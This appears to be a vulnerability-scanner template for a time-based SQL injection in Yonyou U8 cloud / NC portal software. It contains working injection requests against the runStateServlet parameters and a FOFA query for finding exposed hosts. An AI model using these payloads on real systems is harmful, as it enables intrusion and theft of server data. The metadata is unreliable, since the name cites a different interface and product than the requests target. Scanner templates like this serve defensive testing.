id: TVE-2024-105091150

info:
  name: U8cloud系统ExportUfoFormatAction接口存在SQL注入漏洞
  author: k3ppf0r
  severity: high
  description: |  
    NC系统可利用runStateServlet接口中的proDefPk参数实现sql注入，从而窃取服务器的敏感信息。疑似野外利用
  reference:
    - https://security.yonyou.com/#/noticeInfo?id=532
  remediation: |
    打对应补丁，重启服务
  classification:
    cve-id: TVE-2024-105091150
    cvss-score: 7.8
    cwe-id: CWE-89
  metadata:
    date: 2024-03-08
    version: | 
      用友U8 cloud 1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: yonyou,sqli
http:
  - raw:
      - |
        @timeout: 10s
        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}
      
      - |
        @timeout: 10s
        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
        condition: and